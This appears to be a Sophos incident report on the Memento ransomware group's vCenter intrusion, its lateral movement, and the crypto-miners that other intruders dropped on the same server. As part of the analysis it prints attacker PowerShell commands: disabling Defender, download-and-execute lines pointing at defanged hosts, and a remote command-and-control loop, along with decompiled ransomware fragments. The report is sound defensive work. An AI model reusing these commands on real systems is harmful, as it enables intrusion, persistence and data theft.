    "plain_text": "# New ransomware actor uses password-protected archives to bypass encryption protection\n\n**news.sophos.com/en-us/2021/11/18/new-ransomware-actor-uses-password-protected-archives-to-bypass-encryption-**\nprotection/\n\nSean Gallagher November 18, 2021\n\nIn late October, Sophos MTR’s Rapid Response Team encountered a new ransomware\ngroup with an interesting approach to holding victims’ files hostage. The ransomware used\nby this group, who identify themselves as “Memento Team,” doesn’t encrypt files. Instead, it\ncopies files into password-protected archives, using a renamed freeware version of the\nlegitimate file utility WinRAR—and then encrypts the password and deletes the original files.\n\nThis was a retooling by the ransomware actors, who initially attempted to encrypt files\ndirectly—but were stopped by endpoint protection. After failing on the first attempt, they\nchanged tactics, and re-deployed, as evidenced by the multiple versions of the ransomware\npayload compiled at different times found on the victim’s network. They then demanded $1\nmillion US to restore the files, and threatened data exposure if the victim did not comply.\n\nThere were some other twists to the “Memento” attack as well. The ransomware itself is a\n[Python 3.9 script compiled with PyInstaller. And in a ransom note that largely cribs the format](https://www.pyinstaller.org/)\nused by REvil (including the “[-] What’s Happen [-]” introduction), the criminals behind the\n\n\n-----\n\nransomware instructed the victims to contact them via a Telegram account. The attackers\n[also deployed an open-source Python-based keylogger on several machines as they moved](https://github.com/secureyourself7/python-keylogger)\nlaterally within the network using Remote Desktop Protocol.\n\nThe Memento actors also waited a long time before executing their attack—so long that at\nleast two different cryptocurrency miners were dropped onto the server they used for initial\naccess during the course of their dwell time by different intruders using similar exploits.\n\n### Initial compromise\n\nThe ransomware actors appear to have taken advantage of a flaw in VMware’s vCenter\nServer web client first revealed in February. The vulnerability allowed anyone who had\nTCP/IP port 443 access to the server to execute commands remotely with system-level\nprivileges; a firewall had been misconfigured, and the vCenter Server was exposed to the\nInternet on that port. This server had outdated malware protection and was not configured\nwith endpoint detection and response .\n\nWhile there are hints of the actors behind this attack gaining access to the targeted network\nas early as mid-April, the first real signs of intrusion were on May 4: the dropping of\n[PyInstaller-compiled versions of two tools from the Impacket toolset—the](https://github.com/SecureAuthCorp/impacket) [wmiexec remote](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)\nshell tool (which executes commands via Windows Management Instrumentation) and the\n[secretsdump hash dumping tool were dropped onto a Windows server. The hash dump tool](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)\nwas likely used to acquire credentials for accounts that would be used later.\n\nSix days later, they came back and began further setting up shop, first using a PowerShell\ncommand to attempt to turn off malware scanning:\n```\n powershell Set-MpPreference -DisableRealtimeMonitoring $true\n\n```\nNext, the intruders started using PowerShell web requests to pull down files: first, a copy of a\ncommand-line version of the WinRAR utility, and then a pair of RAR archives on the\ncompromised server. These commands were executed using the wmiexec remote shell,\nconnecting to a host (now unreachable) in South Korea:\n```\npowershell Invoke-WebRequest -Uri hxxp://27.102.127[.]120/r.exe -OutFile\nc:\\temp\\r.exe\npowershell Invoke-WebRequest -Uri http://27.102.127[.] 120/x1.rar -OutFile\nc:\\temp\\x1.rar\npowershell Invoke-WebRequest -Uri hxxp://27.102.127[.]120/x2.rar -OutFile\nc:\\temp\\x2.rar\n\n```\nAmong the files then extracted from the RAR archive were:\n\npl.exe—a copy of the Plink SSH tunneling tool, allowing them to gain an interactive\nconsole connection with the compromised server.\n\n\n-----\n\n[nm.exe—NMAP, the network scanning tool.](https://nmap.org/)\n[Npcap-0.93.exe—the installer for the NPCAP network packet capture library and its](https://nmap.org/npcap/)\nassociated kernel driver.\n[mimikatz.exe—Mimikatz, the credential stealing tool.](https://github.com/gentilkiwi/mimikatz)\n\nThe actors used Plink to connect via SSH from another South Korean IP address\n(27[.]102.66.114). Next, they set up a batch file (wincert.bat) as a scheduled task (named\nWindows Defender Metadata Monitor) to establish persistence—pulling commands from a\nPHP script running on the compromised web server operated of a publisher in South Korea\n(novelupdate[.]com) using PowerShell’s Invoke-RestMethod. The script used a nearly\nidentical call to another domain (checkvisa[.]xyz).\n\nNext, the intruders used administrative credentials they had gained to connect to the server\nvia Remote Desktop Protocol, tunneling over the SSH connection. They installed another\nreconnaissance tool—Advanced Port Scanner—as well as the Python 3.9.5 runtime\n[environment. They also dropped two disk utilities—WizTree and](https://diskanalyzer.com/) [DiskSavvy. And they](https://www.disksavvy.com/)\ngradually moved laterally, using Mimikatz and secretsdump to compromise three accounts\nand create two new ones with a compromised “admin” account.\n\nOn September 28, someone (most likely the ransomware actors) dropped another copy of\nthe Plink SSH connection, using the transfer[.]sh file transfer service. They used this\nadditional Plink instance to create a reverse shell connection to the account “dontstarve” at a\nhost named google[.]onedriver-srv[.]ml. This copy of Plink was dropped with the file name\nMicrosoftOutlookUpdater.exe, and the configuration of the SSH connection was invoked with\na MicrosoftOutlookUpdater.bat. Once the reverse shell was set up, the attackers scheduled\na task named “GoogleChangeManagementSchedule”—a PowerShell encoded command\nthat uploaded data about the IP address of the compromised server, and then performed\nsome automated exchanges of data that appear to have been related to reconnaissance:\n\n\n-----\n\n```\n$c \n$p=\"\"\n$r = \"\"\n$u = \"hxxp://google[.]onedriver-srv[.]ml/gadfTs55sghsSSS\"\n$wc = New-Object System.Net.WebClient\n$li = (Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]\n$Response = Invoke-WebRequest -Uri hxxp://curlmyip[.]net -UseBasicParsing\n$c = \"whoami\"\n$c = 'Write-Host \" \";'+$c\n$r = &(gcm *ke-e*) $c | Out-String > \"$env:tmp\\$($Response.Content.Trim())-$($li)\"\n$ur = $wc.UploadFile(\"$u/phppost.php\",\n\"$env:tmp\\$($Response.Content.Trim())-$($li)\")\nwhile($true)\n{\n$c = $wc.DownloadString(\"$u/$($Response.Content.Trim())-$($li)/123.txt\")\n$c = 'Write-Host \" \";'+$c\nif($c -ne $p)\n{\n$r = &(gcm *ke-e*) $c | Out-String > \"$env:tmp\\$($Response.Content.Trim())-$($li)\"\n$p = $c\n$ur = $wc.UploadFile(\"$u/phppost.php\",\n\"$env:tmp\\$($Response.Content.Trim())-$($li)\")\n}\nsleep 3\n}\n\n```\nUncertainty about who did what on the compromised server comes from the fact that there\nwere so many actors who were in play, thanks to the detectability of the vCenter vulnerability\nwith mass Internet scans.\n\n### Extra compromises\n\nOn May 18, another entirely different actor also exploited the vCenter vulnerability to install\nan XMR cryptocurrency miner via PowerShell commands:\n```\npowershell -nop -w hidden -Command $wc = New-Object System.Net.WebClient; $tempfile =\n[System.IO.Path]::GetTempFileName(); $tempfile += '.exe';\n$wc.DownloadFile('hxxp://45.77.76[.]158:25643/w', $tempfile); &amp; $tempfile -u\nbdbe1601; Remove-Item -Force $tempfile\n\n```\nThe miner operator then executed the payload, tmp5FE0.tmp.exe, which in turn registered\nthe Windows driver WinRing0x64.sys as a service to leverage the server’s graphics card for\nmining purposes.\n\nOn September 8, yet another intruder dropped yet another miner (XMRig):\n\n\n-----\n\n```\npowershell Command $wc New Object System.Net.WebClient; $tempfile \n[System.IO.Path]::GetTempFileName(); $tempfile += '.bat';\n$wc.DownloadFile('hxxp://190.144.115[.]54:443 /mine.bat', $tempfile); &amp;\n $tempfile\n43a6eY5zPm3UFCaygfsukfP94ZTHz6a1kZh5sm1aZFBWBnZXPbGtYjRE7pqc2s9dCQ5R2yk1V7SZk\nTWeBk6JiT2q5cXLa7T; \nRemove-Item -Force $tempfile\npowershell -Command $wc = New-Object System.Net.WebClient;\n$wc.DownloadFile('http://lurchmath[.] org/wordpress-temp/ wp-content/plugins\n/xmrig.zip', 'C:\\Windows\\system32\\config\\systemprofile\\xmrig.zip')\npowershell -Command $wc = New-Object System.Net.WebClient; $tempfile =\n[System.IO.Path]::GetTempFileName(); $tempfile += '.bat';\n$wc.DownloadFile('hxxp://190.144.115[.]54:443/mine.bat', $tempfile); &amp; \n$tempfile 43a6eY5zPm3UFCaygfsukfP94ZTHz6a1kZh5sm1aZFBWBnZXPbGtYjRE7pqc2s9dCQ5R\n2yk1V7SZkTWeBk6JiT2q5cXLa7T; \nRemove-Item -Force $tempfile\npowershell -Command $out = cat\n'C:\\Windows\\system32\\config\\systemprofile\\mimu\\config.json' | %{$_ -replace '\"url\":\n*\".*\",', '\"url\": \"195.201.124[.]214:10001\",'} | Out-String; $out | Out-File -Encoding\nASCII 'C:\\Windows\\system32\\config\\systemprofile\\mimu\\config.json'\n\n```\n[This miner operator also dropped a copy of the NSSM services helper to monitor and](http://nssm.cc/)\nmanipulate running services (downloaded from a compromised WordPress site).\n\nXMRig and NSSM were downloaded again on October 3, this time from a GitHub page,\nusing a “support” administrative account created by the miner actors to execute the scripts.\n\n### Meanwhile, back at the ransomware\n\n\n-----\n\nIn October, the Memento gang began preparations to launch ransomware. They used\ndropped a copy of the administrative tool Process Hacker onto the server that they used as\ntheir primary foothold on October 1, and configured Process Hacker’s kernel driver as a\nservice for persistence.\n\nFor the next two weeks, the intruders continued to expand their reach within the network\nusing RDP, occasionally deleting RDP logs to cover their tracks. On October 20, they began\nto use WinRAR to compress a collection of files for exfiltration, moving the archives to a\ndirectory on a shared drive they could access via RDP. They also deployed a Python-based\nkeylogger onto the workstation of the primary system administrator for the organization.\n\nOn October 22, data collection complete, the attackers then used Jetico’s BCWipe data\nwiping utility to remove evidence of the archived files once they were collected and to modify\ntimestamps on others. They also cleared Terminal Services logs to erase evidence of RDP\nsessions.\n\nOn the evening of October 23 (a Saturday), they executed the first iteration of their\nransomware.\n\n\n-----\n\nThe first attempt at the ransomware, RuntimeBroker.exe, used WinRAR to archive the files\nand then attempted to encrypt them. The ransomware, as stated earlier, was an executable\ncompiled from Python 3.9—possibly compiled with the Python instance installed on the\nnetwork by the actors earlier.\n\nBecause the code was compiled with PyInstaller and Python 3.9, we could not completely\ndecompile the ransomware samples. But we were able to decode enough to understand its\nstructure and identify most of how the ransomware worked. Its main function served only to\nkick off the “Demon” function imported from a module named “morph”:\n```\nfrom morph import Demon\ndef main():\ndemon = Demon()\nDemon.start(demon)\nif __name__ == '__main__':\nmain()\n\n```\nThe morph.pyc module that contains the Demon function also includes a number of global\nvariables used by the ransomware:\n\nKEYFILE = ‘config.key’\nURL = ‘hxxp://78[.]138.105.150:11180/sv.php’\nSTART_MSG = ‘Task Started.’\nEND_MSG = ‘Task Completed.’\nCHECK_INTERVAL = 900\nREPORT_INTERVAL = 25\n\nThe config.key file contains a public key. The URL is a command and control server that\nreceives telemetry from each instance of the ransomware.\n\nThe “Demon” class itself executes the various other methods of the ransomware. It\ngenerates a unique ID for the system based on its IP address and Windows system name,\nand launches a “connector” to communicate with the command and control server, the\n[encryption code, and a repeating timer copied straight from Stack Overflow. The connector is](https://stackoverflow.com/questions/12435211/python-threading-timer-repeat-function-every-n-seconds/24488061#24488061)\nused to send system information, including the victim ID, system information, and progress\nmessages as the encryption routine traverses system files.\n\n\n-----\n\n```\nclass Demon:\ndef __init__(self):\n self.id = createID()  # createID returns string with IP address and hostname, like\n\"192.168.1.2-targeted-pc\"\n self.start = datetime(2021, 10, 10, 15, 23) # this time is the same in all three\nsamples, later replaced with actual time\n self.filter = re.compile('.+', re.IGNORECASE)\n self.drivers = []\n self.total_cnt = 0\n self.total_bytes = 0\n self.cur_enc_cnt = 0\n self.cur_report_cnt = 0\n self.error_files = []\n self.connector = Connector(self.id, URL)     # Connector class is loaded from\nconnect.pyc\n self.cryptor = Cryptor(KEYFILE)         # Cryptor, the encryption code, is\nloaded from crypt.pyc\n self.timer = RepeatTimer(CHECK_INTERVAL, self.callbackCheckTimeUp) # RepeatTimer\nis loaded from timer.pyc\n self.sendVicInfo()\n...\n\n```\nThe “createID” function, as noted in the comments we added to the code above, generates a\nunique identifier by creating a socket connection to Google’s DNS service on port 80, and\nretrieving the local IP address for the connection (with socket.getsockname) and the\nsystem’s hostname. Those values are concatenated into a single string, which is used by the\nMemento C2 as a system unique identifier.\n\nThe “sendVicInfo” function is exactly what it sounds like: it aggregates system information\nabout the machine being targeted by the ransomware instance to be sent back over the C2\nconnection to the ransomware actors.\n```\ndef sendVicInfo(self):\nret_str = f'''<=== Start time ===>: {self.start}\\n\\n'''\nuname = platform.uname()\nret_str += f'''System: {uname.system}\\n'''\nret_str += f'''Node Name: {uname.node}\\n'''\nret_str += f'''Release: {uname.release}\\n'''\nret_str += f'''Version: {uname.version}\\n'''\nret_str += f'''Machine: {uname.machine}\\n'''\nret_str += f'''Processor: {uname.processor}\\n\\n'''\nboot_time_timestamp = psutil.boot_time()\nbt = datetime.fromtimestamp(boot_time_timestamp)\nret_str += f'''Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:\n{bt.second}\\n\\n'''\nret_str += 'Total cores: %s\\n' % psutil.cpu_count(True, **('logical',))\nret_str += f'''Total CPU Usage: {psutil.cpu_percent()}%\\n\\n'''\nsvmem = psutil.virtual_memory()\nret_str += f'''Total: {convSize(svmem.total)}\\n'''\nret_str += f'''RAM Percentage: {svmem.percent}%\\n\\n'''\npartitions = psutil.disk partitions()\n\n```\n\n-----\n\nThe cryptor code uses AES to encrypt the files. The public key filename is passed to it as an\nargument, but it’s not used directly as the key for encryption. Rather, it is used to decrypt the\npassword used in combination with a private key that is delivered from the C2 to decrypt a\nfile called selfdel.py.vaultz into a Python resource file. The actual file encryption is AESbased, using cipher block chaining; a password is generated for each file and is RSA\nencrypted. The crypt.pyc that defines the cryptor has the following imports and variables:\n```\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom Crypto.Cipher import AES\nimport random\nimport string\nimport sys\nimport os\nimport subprocess\nSEED_LEN = 32\nINITIAL_VECTOR = b'\\xa4' * AES.block_size\nMAX_READ = 134217728\nMAX_READ_PAD = MAX_READ + AES.block_size\nENC_EXT = 'vaultz'\nSIG_EXT = 'vault-key'\nRAR_EXE = 'r.exe'\n\n```\nThe “RAR_EXE” variable is a reference to the instance of WinRAR used by the attackers in\nthis first version. It appears to be called by a function called encryptFile_r; a separate\nencryptFile function is used to encrypt files, while the encryptFile_r then puts them into an\narchive. While some systems were impacted by this first version of the ransomware, the\nencryption step was caught on systems with anti-ransomware protection.\n\n## Second verse, slightly different than the first\n\nUndeterred, the Memento attackers switched approaches. With their access to the network\nstill intact, they modified the ransomware code; instead of encrypting first, the new code used\nthe WinRAR executable to archive files into a password-protected archive. Two additional\nvariants of the ransomware executable, both compiled as main.exe, were built. Both added a\ncommand line argument handler so that parameters could be passed to the Demon class.\n```\nDemon.start(demon, sys.argv[1])\n\n```\nThe second of the two added code to check the length of the argument passed from the\ncommand line—clearly a debug after the first version failed when no argument was passed.\n\n\n-----\n\n```\nfrom morph import Demon\nimport sys \ndef main(): \ndemon = Demon() \nstart = '' \nif len(sys.argv) > 1: \nstart = sys.argv[1] \nDemon.start(demon, start)\nif __name__ == '__main__': \nmain()\n\n```\nThe morph.pyc file also included some minor tweaks, including a reference to a filter file,\nfilter.txt:\n```\nKEYFILE = 'config.key'\nURL = 'hxxp://78[.]138.105.150:11180/sv.php'\nSTART_MSG = 'Task Started.'\nEND_MSG = 'Task Completed.'\nFILTER_FILE = 'filter.txt'\nCHECK_INTERVAL = 3\nREPORT_INTERVAL = 25\n\n```\nThe contents of filter.txt:\n```\nc:\\\\Documents and Settings\nc:\\\\Users\\\\All Users\nc:\\\\users\\\\Default User\nc:\\\\Programdata\\\\Application Data \nC:\\\\ProgramData\\\\Desktop\nC:\\\\ProgramData\\\\Documents \nC:\\\\ProgramData\\\\Start Menu\"\nC:\\\\ProgramData\\\\Templates \nC:\\\\windows \nRECYCLE.BIN \nLocal Setting \nC:\\\\ \nSystem Volume Information\n\n```\nThis appears to have specified which paths and specific files not to encrypt.\n\nThe modifications to the ransomware changed its behavior to avoid detection of encryption\nactivity. Instead of encrypting files, the “crypt” code now put the files in unencrypted form into\narchive files, using the copy of WinRAR, saving each file in its own archive with a .vaultz file\nextension. Passwords were generated for each file as it was archived. Then the passwords\nthemselves were encrypted.\n\nThese variants were built and executed hours after the first attempt. The malware was\nspread manually by the attackers, using RDP and stolen credentials.\n\n\n-----\n\nA breakdown of attack methods used by the Memento actors\nA ransom note, Hello Message.txt, was dropped after the files were archived. The file was\ndropped manually in the Desktop folder of the primary IT administrator’s workstation. The\nwording and formatting is nearly identical to REvil gang ransom notes, and threatens data\nexposure if the ransom payment is not made. Unlike REvil, however, the demand for\npayment was in Bitcoin, and the Memento actors offered a payment schedule for decryption:\n15.95 BTC (approximately $1 million US) for all files, and varying rates for individual files by\ntype:\n\n\n-----\n\nThe Memento ransom note. The Telegram number was a phone number with a Los Angeles\narea code, likely registered through a VoIP service.\n\n### Pyrrhic victories\n\nAfter over 6 months dwell time on the victim’s network, the attack had finally been sprung.\nUnfortunately for the Memento actors, all that extra work did not pay off as planned. The\nvictim did not negotiate with the ransomware actors.\n\nThanks to backups, the targeted organization was able to restore most of their data and\nreturn to somewhat normal operations. Additionally, for systems that were running\nInterceptX, the endpoint detection and response system logged the commands used by the\n\n\n-----\n\nattack to archive files—along with the unencrypted passwords for the files. SophosLabs and\nSophos Rapid Response were able to recover select files for the victim and provide a\nmethod for recovering any files not backed up.\n\nHaving effective backups of network data is critical to recovery from a ransomware attack.\nUnfortunately, the target’s exfiltrated data is still in play. And that could have long-term\nramifications for the company.\n\nWe believe that the long dwell time by the ransomware actor was in part because they didn’t\nhave ransomware ready to drop at the time of the initial compromise. By keeping a low\nprofile, modifying timestamps on files and wiping logs of telltale signs of compromise, they\nwere able to evade detection for an extremely long time and fully explore the network. The\nextent to which RDP services were enabled throughout the network made hands-onkeyboard lateral movement throughout the network much easier, further reducing the\nsignature of their intrusion.\n\nThe extent to which one unpatched server exposed to the Internet by a misconfigured\nfirewall could be used by multiple malicious actors to exploit the server (and in the case of\nthe ransomware operator, the entire network) offers further emphasis on the urgency of\napplying vendors’ security patches. At the time of the initial compromise, the vCenter\nvulnerability had been public for nearly two months, and it remained exploitable up to the day\nthe server was encrypted by the ransomware attackers. Unfortunately, smaller organizations\noften lack the staff expertise or time required to stay on top of new vulnerability patches\noutside those automatically deployed by Microsoft. And many organizations are unaware of\nthe degree of risk associated with software platforms they use that may have been installed\nby a third-party integrator, contract developer or service provider.\n\nA full list of the IOCs for the Memento attack and the miner attacks from this incident is\n[available on SophosLabs’ GitHub page.](https://github.com/sophoslabs/IoCs/blob/master/ransomware_memento.csv)\n\n**Correction: This report originally noted the deployment of SOTI remote control**\n**software as part of the ransomware attack. Further analysis revealed this was an**\n**unrelated remote control software deployment by an administrator that had not been**\n**shared with Sophos’ Rapid Response team.**\n\n### SophosLabs would like to acknowledge Vikas SIngh, Robert Weiland, Elida Leite, Kyle Link, Ratul Ghosh, Harinder Bhathal, and Sergio Bestuilic of Sophos MTR’s Rapid Response team, and Ferenc László Nagy, Rahul Dugar, Nirav Parekh, and Gabor Szappanos of SophosLabs for their contributions to this report.\n\n\n-----",
